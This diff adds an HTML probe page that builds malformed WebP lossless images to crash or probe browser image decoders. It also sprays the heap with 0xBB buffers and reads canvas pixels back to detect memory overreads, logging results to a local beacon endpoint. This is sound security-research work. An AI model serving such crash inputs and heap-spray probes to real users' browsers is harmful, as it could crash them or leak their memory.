@@ -1,0 +1,172 @@
+<!--
+  p609b: WebP OOM vs buffer-overread discrimination
+
+  p609 found crashes at 16384x16384 VP8L images during drawImage.
+  This probe discriminates OOM from decoder buffer overread:
+
+  Strategy:
+  1. Test VP8L at intermediate dimensions: 1024, 2048, 4096, 8192, 12288, 16384
+     All with minimal compressed data (16B PRNG). Track which survive.
+  2. Test 16384x16384 WITHOUT drawImage — just check if Image loads.
+     If it loads but drawImage crashes → OOM during pixel buffer alloc.
+  3. Test drawImage with clip region on huge image (draw only 64x64 of 16384x16384).
+     Some engines allocate full buffer even for partial draw; some don't.
+  4. Test 8192x8192 with drawImage — 256MB pixel buffer, might survive.
+  5. Heap-seeded test: spray 1000 ArrayBuffers with 0xBB pattern, then decode
+     a 64x64 VP8L from 4B of compressed data. If decoder reads past buffer
+     into heap, some pixels might be 0xBB. If all zeros → safe error path.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p609b</title>
+<script>
+var bx=new XMLHttpRequest();
+function b(m){try{bx.open('GET','/beacon/'+encodeURIComponent(m),false);bx.send();}catch(e){}}
+
+function Z(n){var a=[];for(var i=0;i<n;i++)a.push(0);return a;}
+function P(n){var a=[],s=0xDEAD;for(var i=0;i<n;i++){s^=(s<<13);s^=(s>>>17);s^=(s<<5);a.push(s&0xFF);}return a;}
+
+function riff(cc,p){
+    var cs=p.length,pad=cs&1,fs=4+cc.length+4+cs+pad;
+    var r=[0x52,0x49,0x46,0x46,fs&0xFF,(fs>>8)&0xFF,(fs>>16)&0xFF,(fs>>24)&0xFF,
+           0x57,0x45,0x42,0x50];
+    for(var i=0;i<cc.length;i++)r.push(cc.charCodeAt(i));
+    r.push(cs&0xFF,(cs>>8)&0xFF,(cs>>16)&0xFF,(cs>>24)&0xFF);
+    for(var i=0;i<cs;i++)r.push(p[i]);
+    if(pad)r.push(0);
+    return new Uint8Array(r);
+}
+function L(w,h,al,cd){
+    var hd=((w-1)&0x3FFF)|(((h-1)&0x3FFF)<<14)|((al?1:0)<<28);
+    var p=[0x2F,hd&0xFF,(hd>>8)&0xFF,(hd>>16)&0xFF,(hd>>24)&0xFF];
+    for(var i=0;i<cd.length;i++)p.push(cd[i]);
+    return riff('VP8L',p);
+}
+
+function scan(img,tag,maxDim){
+    try{
+        var w=Math.min(img.width||1,maxDim||256),h=Math.min(img.height||1,maxDim||256);
+        var c=document.createElement('canvas');c.width=w;c.height=h;
+        var ctx=c.getContext('2d');ctx.drawImage(img,0,0,w,h);
+        var pd=ctx.getImageData(0,0,w,h),d=pd.data,nz=0;
+        for(var i=0;i<d.length;i+=4){
+            if(d[i]!==0||d[i+1]!==0||d[i+2]!==0){nz++;}
+        }
+        b(tag+'-PX-nz='+nz+'/'+Math.floor(d.length/4));
+        if(nz>0&&nz<=16){
+            var s=[];
+            for(var i=0;i<d.length&&s.length<8;i+=4){
+                if(d[i]!==0||d[i+1]!==0||d[i+2]!==0)
+                    s.push(i/4+':'+d[i]+','+d[i+1]+','+d[i+2]+','+d[i+3]);
+            }
+            b(tag+'-V='+s.join('|'));
+        }
+        return nz;
+    }catch(e){b(tag+'-PXE='+e.message);return -1;}
+}
+
+function clipScan(img,tag){
+    try{
+        var c=document.createElement('canvas');c.width=64;c.height=64;
+        var ctx=c.getContext('2d');
+        ctx.drawImage(img,0,0,64,64,0,0,64,64);
+        var pd=ctx.getImageData(0,0,64,64),d=pd.data,nz=0;
+        for(var i=0;i<d.length;i+=4){
+            if(d[i]!==0||d[i+1]!==0||d[i+2]!==0){nz++;}
+        }
+        b(tag+'-CLIP64-nz='+nz+'/4096');
+        return nz;
+    }catch(e){b(tag+'-CLIPE='+e.message);return -1;}
+}
+
+var tests=[];
+var dims=[1024,2048,4096,8192,12288,16384];
+for(var di=0;di<dims.length;di++){
+    (function(d){
+        tests.push(['DIM-'+d,L(d,d,0,P(16)),d]);
+    })(dims[di]);
+}
+tests.push(['16K-NOCANVAS',L(16384,16384,0,P(16)),0]);
+tests.push(['16K-CLIP64',L(16384,16384,0,P(16)),-1]);
+tests.push(['8K-CLIP64',L(8192,8192,0,P(16)),-2]);
+tests.push(['HEAP-SEED-64',L(64,64,0,P(4)),64]);
+
+function main(){
+    if(typeof Blob==='undefined'){b('NO-BLOB');return;}
+    var t0=Date.now();
+    b('P609B-DISCRIM-'+tests.length+'T');
+    var sk=0;try{sk=parseInt(localStorage.getItem('p609bs')||'0');}catch(e){}
+    if(sk>0)b('SKIP='+sk);
+
+    function run(i){
+        if(i>=tests.length){
+            b('P609B-DONE-'+(Date.now()-t0)+'ms');
+            try{localStorage.removeItem('p609bs');}catch(e){}
+            return;
+        }
+        try{localStorage.setItem('p609bs',String(i+1));}catch(e){}
+        var name=tests[i][0],data=tests[i][1],mode=tests[i][2];
+        b('T'+i+'-'+name);
+
+        if(name==='HEAP-SEED-64'){
+            var spray=[];
+            for(var s=0;s<1000;s++){
+                var ab=new ArrayBuffer(256);
+                var u8=new Uint8Array(ab);
+                for(var j=0;j<256;j++)u8[j]=0xBB;
+                spray.push(u8);
+            }
+            b('HEAP-SEEDED-1000x256');
+        }
+
+        var blob=new Blob([data],{type:'image/webp'});
+        var url=URL.createObjectURL(blob);
+        var img=new Image(),dn=false;
+
+        img.onload=function(){
+            if(dn)return;dn=true;
+            b('T'+i+'-LOADED-'+img.width+'x'+img.height);
+
+            if(mode===0){
+                b('T'+i+'-NOCANVAS-OK');
+                URL.revokeObjectURL(url);
+                run(i+1);
+                return;
+            }
+
+            if(mode===-1){
+                clipScan(img,'T'+i);
+                URL.revokeObjectURL(url);
+                run(i+1);
+                return;
+            }
+
+            if(mode===-2){
+                clipScan(img,'T'+i);
+                URL.revokeObjectURL(url);
+                run(i+1);
+                return;
+            }
+
+            var nz=scan(img,'T'+i,Math.min(mode,256));
+            URL.revokeObjectURL(url);
+            run(i+1);
+        };
+
+        img.onerror=function(){
+            if(dn)return;dn=true;
+            b('T'+i+'-ERR');
+            URL.revokeObjectURL(url);
+            run(i+1);
+        };
+
+        setTimeout(function(){
+            if(!dn){dn=true;b('T'+i+'-TMO');URL.revokeObjectURL(url);run(i+1);}
+        },10000);
+
+        img.src=url;
+    }
+    run(sk);
+}
+setTimeout(main,200);
+</script></head><body>p609b: WebP OOM discriminator</body></html>
